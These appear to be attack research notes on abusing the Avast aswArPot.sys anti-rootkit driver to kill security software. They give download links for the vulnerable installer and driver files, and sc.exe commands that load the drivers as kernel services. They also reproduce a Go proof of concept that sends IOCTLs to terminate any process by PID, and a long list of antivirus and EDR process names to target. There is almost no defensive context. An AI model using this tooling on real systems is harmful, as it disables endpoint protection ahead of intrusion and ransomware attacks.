# Research - BYOVD Avast! aswArPot  

Articles  
https://www.bleepingcomputer.com/news/security/hackers-abuse-avast-anti-rootkit-driver-to-disable-defenses/  
https://www.trendmicro.com/en_us/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-Virus-scans-log4shell.html  
https://cybersecuritynews.com/10-year-old-flaws-with-avast-and-avg/  

Related CVEs  
CVE-2022-26522  
CVE-2022-26523  
CVE-2021-40539  

Avast download 20.8.2432  
https://archive.org/details/avast_free_antivirus_setup_offline_202010  

Original download  
http://files.avast.com/iavs9x/avast_free_antivirus_setup_offline.exe  

Path after install of 20.8.2432  
```  
C:\Program Files\Avast Software\Avast\setup\Inf\x64\aswArPot.sys
```  

aswArPot.sys  
https://file.io/FJbxjNwn10Jk  

aswSP.sys
https://file.io/kPinktjisJ2Y  

Create aswSP_ArPot2 service  
```  
sc.exe create aswSP_ArPot2 binPath= C:\<Path to driver>\aswArPot.sys type= kernel
```  

Create aswSP_Avar service  
```  
sc create aswSP_Avar binPath= "C:\<Path to driver>\aswSP.sys" type= kernel start= demand
```  

POC - https://github.com/timwhitez/killProcessPOC/blob/main/aswarpot.go  
```  
package main

import (
	"fmt"
	"golang.org/x/sys/windows"
	"os"
	"strconv"
	"unsafe"
)

func main() {
	if len(os.Args) != 2 {
		fmt.Println("./device.exe pid")
		return
	}

	if os.Args[1] == "-h" {
		fmt.Println("./device.exe pid")
		return
	}

	var volumename = fmt.Sprintf("\\\\.\\aswSP_ArPot2")
	hVolume, _ := windows.CreateFile(windows.StringToUTF16Ptr(volumename), 0xc0000000, 0, nil, windows.OPEN_EXISTING, 0x80, 0)

	//var local_10 []byte
	var local_1c uint32
	windows.DeviceIoControl(hVolume, 0x7299c004, nil, 4, nil, 0, &local_1c, nil)

	volumename = fmt.Sprintf("\\\\.\\aswSP_Avar")
	local_c, _ := windows.CreateFile(windows.StringToUTF16Ptr(volumename), 0xc0000000, 0, nil, windows.OPEN_EXISTING, 0x80, 0)

	pid, _ := strconv.Atoi(os.Args[1])
	processID := uint32(pid)
	var local_2c uint32
	windows.DeviceIoControl(local_c, 0x9988c094, (*byte)(unsafe.Pointer(&processID)), 4, nil, 0, &local_2c, nil)

	windows.CloseHandle(hVolume)
	windows.CloseHandle(local_c)

}
```  

## Security Process Names  
```  
ERAAgent.exe
efwd.exe
SophosSafestore64.exe
PEFService.exe
mfefw.exe
mfemms.exe
mfewc.exe
McDiReg.exe
ProtectedModuleHost.exe
msmpeng.exe
ssdvagent.exe
avp.exe
swc_service.exe
bccavsvc.exe
psuaservice.exe
TmCCSF.exe
coreserviceshell.exe
repux.exe
vapm.exe
cylancesvc.exe
avpsus.exe
sbamtray.exe
sophoslivequeryservice.exe
epwd.exe
sophosmtrextension.exe
sophoscleanup.exe
iptray.exe
sentinelservicehost.exe
endpointbasecamp.exe
macompatsvc.exe
sepWscSvc64.exe
epab_svc.exe
mcsagent.exe
sophosfilescanner.exe
aswtoolssvc.exe
mfemactl.exe
avpsus.exe
avpui.exe
mcupdatemgr.exe
McAWFwk.exe
mfewch.exe
mfevtps.exe
McCSPServiceHost.exe
McPvTray.exe
MMSSHOST.exe
sophosui.exe
avastui.exe
paui.exe
bcc.exe
psuamain.exe
tesvc.exe
coreframeworkhost.exe
RepUtils.exe
updaterui.exe
cptrayui.exe
savservice.exe
SBAMSvc.exe
sophossafestore.exe
epam_svc.exe
sdcservice.exe
hostedagent.exe
idafserverhostservice.exe
sentinelhelperservice.exe
cetasvc.exe
macmnsvc.exe
sepagent.exe
responseservice.exe
mbcloudea.exe
SophosCleanM64.exe
easervicemonitor.exe
mfeann.exe
SophosNtpService.exe
ekrn.exe
MsMpEng.exe
QcShm.exe
mfeatp.exe
mfehcs.exe
mcshield.exe
Launch.exe
MclnstruTrack.exe
MfeAVSvc.exe
avastsvc.exe
ntrtscan.exe
svcgenerichost.exe
psanhost.exe
swi_service.exe
clientmanager.exe
repmgr.exe
tmlisten.exe
cptraylogic.exe
savapi.exe
vstskmgr.exe
wrsa.exe
efrservice.exe
scanhost.exe
sophosfimservice.exe
hostedagent.exe
SentinelAgentWorker.exe
cloudendpointservice.exe
logwriter.exe
SentinelUl.exe
dsa-connect.exe
mbamservice.exe
smcgui.exe
endpoint agent tray.exe
mctray.exe
SophosHealth.exe
eguiProxy.exe
agentsvc.exe
ModuleCoreService.exe
mfeesp.exe
mfeensppl
mfetp.exe
delegate.exe
McUICnt.exe
alsvc.exe
notifier.exe
sspservice.exe
pccntmon.exe
swi_fc.exe
ccsvchst.exe
remediationservice.exe
tmcpmadapter.exe
cpda.exe
savadminservice.exe
VipreNis.exe
ds_monitor.exe
dsa.exe
sbpimsvc.exe
sophososquery.exe
hmpalert.exe
sentinelagent.exe
sophos ui.exe
klnagent.exe
sentinelstaticenginescanner.exe
wscommunicator.exe
masvc.exe
sfc.exe
fsagentservice.exe
mcsclient.exe
sophosfs.exe
avwrapper.exe
```  

